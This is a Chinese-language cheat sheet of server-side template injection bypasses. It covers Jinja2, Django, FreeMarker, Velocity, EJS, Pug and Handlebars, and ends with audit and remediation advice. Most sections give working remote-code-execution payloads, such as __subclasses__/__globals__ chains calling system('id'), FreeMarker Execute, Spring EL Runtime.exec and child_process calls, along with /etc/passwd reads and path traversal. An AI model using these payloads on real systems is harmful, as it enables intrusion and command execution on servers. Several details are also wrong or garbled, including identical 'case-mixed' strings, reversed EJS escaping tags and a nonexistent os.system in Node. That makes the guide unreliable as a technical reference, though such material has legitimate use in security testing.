# 服务器端模板注入（SSTI）绕过技巧

本文档汇总常见的 SSTI 防护机制绕过技巧，用于深度安全审计和漏洞验证。

---

## 1. 模板语法检测绕过

### 1.1 特殊字符编码绕过

**防护机制**：检查模板语法特殊字符（如 `{{`, `{%`, `<%`, 等）

```python
# 防护代码
def sanitize_template(user_input):
    # 黑名单过滤
    dangerous_chars = ['{{', '}}', '{%', '%}', '<%', '%>']
    for char in dangerous_chars:
        if char in user_input:
            raise ValueError("Dangerous characters detected")
    return user_input
```

**绕过技巧**：

#### 方式 1：URL 编码
```
原始被拦截：{{ 7 * 7 }}
绕过：%7B%7B 7 * 7 %7D%7D
服务器解码后成为：{{ 7 * 7 }}
```

#### 方式 2：HTML 实体编码
```
原始被拦截：{{ 7 * 7 }}
绕过：&#123;&#123; 7 * 7 &#125;&#125;
模板引擎可能会解码这些实体
```

#### 方式 3：Unicode 编码
```
原始被拦截：{{ 7 * 7 }}
绕过：\u007b\u007b 7 * 7 \u007d\u007d
或：\x7b\x7b 7 * 7 \x7d\x7d
```

#### 方式 4：混合编码
```
绕过：%7B { 7 * 7 } %7D
部分编码部分原文，绕过黑名单
```

#### 方式 5：大小写混合
```
原始被拦截：{{ 7 * 7 }}
绕过（某些模板引擎）：{{ 7 * 7 }} 或 {[ 7 * 7 ]}
取决于模板引擎对大小写的敏感性
```

### 1.2 空白字符和换行绕过

**防护机制**：检查连续的模板定界符

```php
// 防护代码
$blocked = preg_match('/\{\{.*\}\}/', $input);
```

**绕过技巧**：

#### 方式 1：中间插入换行
```
原始被拦截：{{ 7 * 7 }}
绕过：{{
     7 * 7
     }}
```

#### 方式 2：制表符和空格
```
绕过：{
     {
     7 * 7
     }
     }

或：{{	7 * 7 }}  (中间是制表符)
```

#### 方式 3：特殊空白字符
```
绕过：{{[垂直制表符] 7 * 7 [垂直制表符]}}
使用不可见的空白字符
```

---

## 2. 变量访问限制绕过

### 2.1 黑名单绕过

**防护机制**：禁用访问危险的对象和方法

```jinja2
{# 防护代码 #}
{# 禁用访问 __class__, __bases__, __subclasses__, os, system 等 #}
{{ user_data }}  {# 安全 #}
{{ __import__ }}  {# 被拦截 #}
```

**绕过技巧**：

#### 方式 1：对象属性链绕过
```jinja2
{# 黑名单：__class__, __bases__, __subclasses__ #}
{# 绕过：使用替代属性 #}

{{ "".__class__.__bases__[0].__subclasses__() }}  {# 被拦截 #}
{{ ""['__class__']['__bases__'][0]['__subclasses__']() }}  {# 可能绕过 #}

{# 使用 dir() 和 getattr() #}
{{ ().__class__.__mro__[1].__subclasses__() }}
```

#### 方式 2：字符串拼接绕过
```jinja2
{# 黑名单：__class__, system #}
{# 绕过：使用字符串拼接 #}

{{ ""['__' + 'class' + '__'] }}
{{ request|attr('_' + '_' + 'class' + '_' + '_') }}
```

#### 方式 3：使用 format 和 join
```jinja2
{# 绕过黑名单 #}
{{ ("__clas" + "s__") }}
{{ "_".join(['__', 'class', '__']) }}
```

#### 方式 4：编码变量名
```jinja2
{# 黑名单：__import__ #}
{# 绕过：Base64 编码或其他编码 #}

{% set import_func = "__import__"[::1][::-1] %}  {# 反向 #}
{{ ().__class__.__bases__[0].__subclasses__() }}
```

#### 方式 5：递归访问
```jinja2
{# 黑名单：__subclasses__ #}
{# 绕过：通过其他对象属性链 #}

{{ ().__class__.__bases__[0] }}
{{ (0).__class__.__bases__[0].__subclasses__() }}
```

### 2.2 白名单绕过

**防护机制**：只允许访问特定的变量和方法

```python
# 防护代码
SAFE_CONTEXT = {
    'user': user_object,
    'post': post_object
}

template = env.from_string(user_template)
result = template.render(SAFE_CONTEXT)
```

**绕过技巧**：

#### 方式 1：对象属性链
```
白名单：user, post
绕过：{{ user.__class__.__mro__ }}
     {{ post.__dict__ }}
利用对象的隐藏属性访问其他对象
```

#### 方式 2：方法引用
```python
# 白名单允许的方法
{{ user.get_profile() }}

# 绕过：访问其他对象或方法
{{ user.__class__.__init__.__globals__ }}
```

#### 方式 3：列表和字典操作
```
白名单：user (包含 email 和 name)
绕过：{{ user['__class__'] }}
     {{ user.__dict__ }}
```

---

## 3. 代码执行防护绕过

### 3.1 危险函数禁用绕过

**防护机制**：禁用 import、exec、eval 等函数

```python
# 防护代码（Jinja2）
from jinja2.sandbox import SandboxedEnvironment

env = SandboxedEnvironment()
# 自动禁用危险函数
```

**绕过技巧**：

#### 方式 1：Gadget Chain 利用
```jinja2
{# 禁用：__import__, exec, eval, system #}

{# 绕过：使用可用的 Gadget Chain #}
{# Popen 链 #}
{{ ().__class__.__bases__[0].__subclasses__()[104].__init__.__globals__['system']('id') }}

{# subprocess.Popen 链 #}
{# 或 os.system 链 #}
```

#### 方式 2：使用标准库的隐藏方法
```jinja2
{# 禁用：import, system #}

{# 绕过：使用其他可访问的方法 #}
{{ ().__class__.__bases__[0].__subclasses__()[105].__init__.__globals__['popen']('id') }}

{# 或通过 __subclasses__ 查找可用的类 #}
```

#### 方式 3：嵌套表达式
```jinja2
{# 防护：检查顶级函数 #}

{# 绕过：通过嵌套调用 #}
{% set x = ().__class__.__bases__[0].__subclasses__() %}
{% for item in x %}
    {% if item.__name__ == 'Popen' %}
        {{ item }}
    {% endif %}
{% endfor %}
```

#### 方式 4：属性赋值和调用
```jinja2
{# 防护：不允许直接调用 system #}

{# 绕过：先获取引用，再调用 #}
{% set os = ().__class__.__bases__[0].__subclasses__()[104].__init__.__globals__['os'] %}
{{ os.system('id') }}
```

### 3.2 过滤器链绕过

**防护机制**：使用过滤器进行转义

```jinja2
{# 防护代码 #}
{{ user_input|safe }}  {# 禁止使用 safe 过滤器 #}
{{ user_input|escape }}  {# 转义特殊字符 #}
```

**绕过技巧**：

#### 方式 1：多层过滤器
```jinja2
{# 防护：|escape #}

{# 绕过：使用其他过滤器链 #}
{{ user_input|lower|safe }}  {# 如果未检查多层 #}
{{ user_input|list|join|safe }}  {# 可能绕过检查 #}
```

#### 方式 2：自定义过滤器
```jinja2
{# 如果应用定义了自定义过滤器 #}
{{ user_input|custom_filter }}

{# 绕过：如果自定义过滤器有漏洞 #}
```

---

## 4. 特定模板引擎绕过

### 4.1 Jinja2 绕过

**防护机制**：SandboxedEnvironment 限制

```python
# 防护代码
from jinja2.sandbox import SandboxedEnvironment

env = SandboxedEnvironment()
template = env.from_string(user_input)
```

**绕过技巧**：

#### 方式 1：__subclasses__ 链
```jinja2
{{ ().__class__.__bases__[0].__subclasses__() }}
```

#### 方式 2：字符串格式化
```jinja2
{# 使用 format 访问对象属性 #}
{{ "{0.__class__}".format(user) }}

{# 使用字符串方法 #}
{{ user.__init__.__globals__.system('id') }}
```

#### 方式 3：对象迭代
```jinja2
{% for item in ().__class__.__bases__[0].__subclasses__() %}
    {% if 'Popen' in item.__name__ %}
        {{ item }}
    {% endif %}
{% endfor %}
```

#### 方式 4：配置对象
```jinja2
{# 访问模板配置 #}
{{ config }}
{{ config.__class__ }}
{{ self }}
{{ self.__dict__ }}
```

### 4.2 Django 模板绕过

**防护机制**：限制模板语法和访问

```django
{# 防护代码 #}
{{ user.email }}  {# 安全 #}
{{ user.password }}  {# 被转义 #}
{% if user.is_admin %}  {# 检查限制 #}
```

**绕过技巧**：

#### 方式 1：属性链
```django
{# 访问隐藏属性 #}
{{ user.__dict__ }}
{{ user.__class__.__mro__ }}

{# 如果 Django 未完全限制 #}
```

#### 方式 2：模板继承漏洞
```django
{# 如果允许动态继承 #}
{% extends user_template %}  {# 用户控制的模板 #}
```

#### 方式 3：包含本地文件
```django
{# 防护：不允许路径遍历 #}
{% include template_name %}

{# 绕过：如果路径验证不完整 #}
{% include "../../etc/passwd" %}
```

### 4.3 Freemarker 绕过

**防护机制**：限制对象访问

```freemarker
{#* 防护代码 *#}
${user.name}  {#* 安全 *#}
${user.password}  {#* 被限制 *#}
```

**绕过技巧**：

#### 方式 1：new 操作符
```freemarker
{#* 创建对象 *#}
<#assign value = "freemarker.template.utility.Execute"?new()>
${value("id")}

{#* 或使用其他可访问的类 *#}
```

#### 方式 2：对象环绕器
```freemarker
{#* 访问对象的隐藏属性 *#}
${user?api}
```

### 4.4 Velocity 绕过

**防护机制**：限制反射和动态方法调用

```velocity
#set($user = $context.user)
## 防护：不允许反射调用
#set($obj = $context.System)  ## 被限制
```

**绕过技巧**：

#### 方式 1：Method 对象
```velocity
#set($method = $object.class.methods)
#foreach($m in $method)
    $m.name
#end

{#* 或直接调用方法 *#}
#set($rt = $object.class.forName("java.lang.Runtime"))
```

#### 方式 2：反射绕过
```velocity
#set($process = $object.class.forName("java.lang.ProcessBuilder"))
#set($constructor = $process.getConstructor($null))
```

### 4.5 EJS (Node.js) 绕过

**防护机制**：输入转义

```javascript
// 防护代码
<%- user.input %>  // 转义输出
<%= user.input %>  // 未转义（危险）
```

**绕过技巧**：

#### 方式 1：JavaScript 代码注入
```ejs
<%
// 直接在 EJS 中执行 JavaScript
const child_process = require('child_process');
child_process.exec('id', (err, stdout) => {
    response.write(stdout);
});
%>
```

#### 方式 2：require 调用
```ejs
<%
const fs = require('fs');
const content = fs.readFileSync('/etc/passwd', 'utf8');
%>
<%= content %>
```

### 4.6 Pug (Node.js) 绕过

**防护机制**：模板语法限制

```pug
/- 防护代码
p= user.name
p!= user.input  /- 不转义（危险）
```

**绕过技巧**：

#### 方式 1：JavaScript 代码块
```pug
- const child_process = require('child_process');
- child_process.exec('id', (err, stdout) => { ... })
```

#### 方式 2：条件和循环中的代码
```pug
if true
  - const os = require('os');
  p= os.system('whoami')
```

### 4.7 Handlebars (Node.js) 绕过

**防护机制**：不允许访问 prototype 和 constructor

```handlebars
{{! 防护代码 }}
{{name}}
{{#if user.isAdmin}}
```

**绕过技巧**：

#### 方式 1：使用 lookup helper
```handlebars
{{lookup this "constructor"}}
{{lookup this "prototype"}}

{{#each (lookup this "constructor")}}
  ...
{{/each}}
```

#### 方式 2：Paths with dots
```handlebars
{{#with (lookup this "constructor")}}
  {{constructor}}
{{/with}}
```

---

## 5. 沙箱逃逸

### 5.1 Python SSTI 沙箱逃逸

**防护机制**：使用 SandboxedEnvironment 或 RestrictedPython

```python
# 防护代码
from jinja2.sandbox import SandboxedEnvironment
env = SandboxedEnvironment()

# 或使用 RestrictedPython
from RestrictedPython import compile_restricted
```

**绕过技巧**：

#### 方式 1：对象属性链完整利用链
```python
# 完整的 RCE payload
{{ ().__class__.__bases__[0].__subclasses__()[104].__init__.__globals__['system']('id') }}

# 或使用 Popen
{{ ().__class__.__bases__[0].__subclasses__()[105].__init__.__globals__['Popen']('id') }}

# 获取所有子类后进行搜索
{% for item in ().__class__.__bases__[0].__subclasses__() %}
    {% if 'Popen' in item.__name__ %}
        {{ item.__init__.__globals__ }}
    {% endif %}
{% endfor %}
```

#### 方式 2：使用 __mro__ 和 __subclasses__
```python
{{ ().__class__.__mro__[1].__subclasses__()[107].__init__.__globals__['system']('id') }}
```

#### 方式 3：通过对象属性查找
```python
{{ ().__class__.__init__.__globals__['__builtins__']['__import__']('os').system('id') }}
```

### 5.2 Java SSTI 沙箱逃逸

**防护机制**：SecurityManager 或模板引擎限制

**绕过技巧**：

#### 方式 1：反射调用（FreeMarker）
```java
<#assign value = "freemarker.template.utility.Execute"?new()>
${value("id")}
```

#### 方式 2：Spring EL（如果可用）
```
{{T(java.lang.Runtime).getRuntime().exec('id')}}
```

---

## 6. 注释和特殊语句绕过

### 6.1 使用注释绕过检测

**防护机制**：简单的字符串匹配

```python
# 防护代码
if '__import__' in user_input:
    raise ValueError("Blocked")
```

**绕过技巧**：

#### 方式 1：模板注释
```jinja2
{# 模板注释不会被处理 #}
{{ '__import__' }}  {# 被 split #}

{# 绕过：在注释中注入代码 #}
{# {{ '__im' #}{{ 'port__' }} #}
```

#### 方式 2：代码注释
```python
{{ '__' + 'import__' }}  {# 拼接绕过 #}
```

---

## 7. 多语言模板共存绕过

### 7.1 混合模板语言

**防护机制**：针对单一模板引擎的防护

**绕过技巧**：

#### 方式 1：混合 Django 和 Jinja2 语法
```
如果应用同时支持多种模板语言
可能对一种语言的防护不适用于另一种

Django: {{ user.name }}
Jinja2: {% if user.isAdmin %}
混合：{{ user.__class__ }}  {# 在错误的引擎中可能会被当作普通文本 #}
```

---

## 8. 二阶注入绕过

### 8.1 存储的 SSTI

**防护机制**：一次性验证用户输入

```python
# 防护代码（不完整）
@app.route('/save_profile', methods=['POST'])
def save_profile():
    user.bio = request.form['bio']  # 验证了输入
    db.session.commit()

@app.route('/view_profile/<user_id>')
def view_profile(user_id):
    user = db.session.query(User).get(user_id)
    template = Template(user.bio)  # 但在渲染时没有验证
    return template.render()
```

**绕过技巧**：

#### 方式 1：延迟注入
```
步骤1：提交看似安全的输入
  "My bio: {{ 7 * 7 }}"
步骤2：输入被存储到数据库
步骤3：被视为用户的生物信息
步骤4：页面加载时，模板被渲染
步骤5：注入被执行
```

#### 方式 2：上下文污染
```
步骤1：在用户名字段注入
  "{{ admin_user }}"
步骤2：被存储
步骤3：在另一个页面被当作模板变量
步骤4：注入被执行
```

---

## 9. 条件和循环中的注入

### 9.1 条件分支的绕过

**防护机制**：检查模板的顶级表达式

```python
# 防护代码（不完整）
def is_safe(template_str):
    # 仅检查顶级是否包含危险字符
    return '{{' not in template_str
```

**绕过技巧**：

#### 方式 1：在条件中注入
```jinja2
{% if some_condition %}
    {{ __import__ }}  {# 隐藏在条件中 #}
{% endif %}
```

#### 方式 2：在循环中注入
```jinja2
{% for item in items %}
    {% if item.name == 'admin' %}
        {{ item.__class__ }}  {# 在循环中注入 #}
    {% endif %}
{% endfor %}
```

---

## 10. 防护机制检查清单

在进行安全审计时，检查以下防护机制：

| 防护机制 | 绕过难度 | 常见绕过方式 |
|---------|---------|----------|
| 黑名单字符检查 | 低 | 编码、拼接、空白字符 |
| 简单黑名单 | 低 | 字符编码、字符串拼接 |
| 白名单限制 | 中 | 对象属性链、隐藏属性 |
| 转义过滤 | 中 | 多层过滤器、自定义过滤器 |
| SandboxedEnvironment | 中-高 | Gadget Chain、属性链 |
| SecurityManager | 高 | 反射、特定类的使用 |
| 二次渲染防护 | 中 | 上下文污染、多阶段注入 |

---

## 11. 审计建议

### 高风险指标
- 直接使用用户输入作为模板
- 模板中包含用户可控的变量
- 缺少对模板定界符的检查
- 防护基于黑名单而非白名单
- 允许在模板中访问对象属性
- 缺少对二阶注入的防护
- 混合使用多种模板引擎
- 在条件或循环中使用用户输入作为模板

### 审计步骤
1. **识别模板注入点**：搜索 Template、render、compile 等关键词
2. **确定模板引擎**：识别使用的模板引擎类型
3. **追踪用户输入**：确认用户输入如何到达模板渲染
4. **验证防护机制**：评估现有的验证和过滤
5. **测试绕过技巧**：使用本文档中的技巧进行测试
6. **测试多引擎支持**：检查是否支持多种模板语言
7. **检查二阶注入**：测试存储的数据在渲染时的行为
8. **生成报告**：记录所有发现的 SSTI 漏洞

### 验证修复
修复 SSTI 漏洞时，确保：
- 避免使用用户输入作为模板（最重要）
- 如必须使用，应用白名单而非黑名单
- 使用沙箱环境（如 SandboxedEnvironment）
- 严格限制模板中可访问的对象和方法
- 对所有用户输入进行验证和转义
- 定期更新模板引擎到最新版本
- 实施完整的日志和监控机制
- 对存储的数据也要进行验证（防止二阶注入）
